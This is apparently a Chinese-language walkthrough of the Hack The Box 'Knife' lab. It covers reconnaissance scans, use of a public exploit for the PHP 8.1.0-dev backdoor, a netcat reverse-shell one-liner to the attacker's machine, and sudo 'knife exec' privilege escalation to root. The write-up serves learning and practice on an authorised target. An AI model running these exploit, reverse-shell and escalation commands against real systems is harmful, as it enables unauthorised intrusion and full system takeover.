# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
┌──(root💀kali)-[~/htb/Knife]
└─# nmap -sV -Pn 10.10.10.242    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-27 23:34 EST
Nmap scan report for 10.10.10.242
Host is up (0.34s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.42 seconds
```

## 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.242

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.242/_21-11-27_23-34-49.txt

Error Log: /root/dirsearch/logs/errors-21-11-27_23-34-49.log

Target: http://10.10.10.242/

[23:34:50] Starting:  
[23:36:09] 200 -    6KB - /index.php                                        
[23:36:09] 200 -    6KB - /index.php/login/                                 
```

好像没有啥特别有用的页面或者目录


## 源代码审查

没看出来有啥有用的东西


## 软件版本枚举

80端口是一个叫EMA的网站展示页，查了一下，EMA就是Emergent Medical Associates，紧急医疗服务。没看出来有用啥明显的cms
Apache版本没看到有啥有用的漏洞
ssh版本没看到有啥有用的漏洞

# 初始shell

查看站点信息：
```
┌──(root💀kali)-[~/htb/Knife]
└─# whatweb -a 3 http://10.10.10.242/                                 
http://10.10.10.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]  
```

看到网站用的是```PHP/8.1.0-dev```版本，在谷歌搜索发现这个开发版本存在一个backdoor，我们使用[这个攻击脚本](https://www.exploit-db.com/exploits/49933)拿初始shell

把攻击代码下载到本地，发动攻击：
```
┌──(root💀kali)-[~/htb/Knife]
└─# python3 499933.py                                                                     
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ whoami
james

```

拿到一个初始shell

拿到user.txt
```
$ find / -name user.txt
/home/james/user.txt

```

# 提权
查看sudo特权
```
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

```

可以无密码使用knife

我们使用下面命令提权到root
> sudo /usr/bin/knife exec -E 'exec "/bin/sh"'

返回：
```
$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
No input file specified.

```



经过测试我们发现exp并不是一个完整的shell，很多命令不能正确执行

查看当前用户家目录，发现有ssh登录凭证
```
$ ls -alh /home/james/.ssh
total 16K
drwx------ 2 james james 4.0K May 18  2021 .
drwxr-xr-x 5 james james 4.0K May 18  2021 ..
-rw------- 1 james james 3.4K May  7  2021 id_rsa
-rw-r--r-- 1 james james  741 May  7  2021 id_rsa.pub

```

把公钥加到靶机id_rsa.pub，把私钥下载到本地，用ssh -i登录，发现还是要使用密码，查看ssh配置```/etc/ssh/sshd_config```,发现没有开启私钥登录设置

好像又走到死胡同。。

然后一个个枚举反弹完整的shell到kali，发现下面这个payload是可以运行的

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4242 >/tmp/f

拿到root.txt

```
┌──(root💀kali)-[~/htb/Knife]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.242] 38954
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "__import__('pty').spawn('/bin/bash')"
james@knife:/$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'

sudo /usr/bin/knife exec -E 'exec "/bin/sh"'

# # id
id
uid=0(root) gid=0(root) groups=0(root)
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
{逗你玩儿~}

```